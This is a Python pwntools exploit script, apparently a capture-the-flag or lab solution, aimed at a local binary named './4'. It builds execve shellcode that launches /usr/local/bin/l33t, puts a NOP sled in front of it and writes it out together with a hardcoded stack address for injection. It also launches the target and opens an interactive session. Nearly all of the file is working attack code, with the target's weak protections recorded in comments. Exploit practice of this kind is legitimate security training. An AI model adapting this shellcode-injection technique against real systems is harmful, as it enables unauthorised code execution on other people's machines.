#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './4')
#exe = context.binary = ELF('gdb ./4')


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

#l33tpath = "/usr/local/bin/l33t"
#l33tcode = asm(shellcraft.execve(l33tpath, '', ''))

#print(shellcraft.syscall('SYS_execve', 1, 'rsp', 2, 0).rstrip())

l33tpath = '/usr/local/bin/l33t'

shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
#shellcode = asm(shellcraft.syscall('SYS_execve', l33tpath, 'rsp', 0, 0))

nop_sled = b'\x90' * 200
shellcode = nop_sled + shellcode

payload = fit({
    0: shellcode,
   # 160: p64(0xcafebabe)
})
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)


with open('shellcode.bin', 'wb') as f:
        f.write(shellcode)

# Write the addr to a file
with open('addr4.bin', 'wb') as f:
        f.write(p64(0x7fffffffef36))



#testenv = {
#        "USERNAME": "eliaspwnie",
#        "HOSTNAME": "eliashost.comie",
#       # "L33T": payload
#        "SHCODE": shellcode
#}

print(payload)

#context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

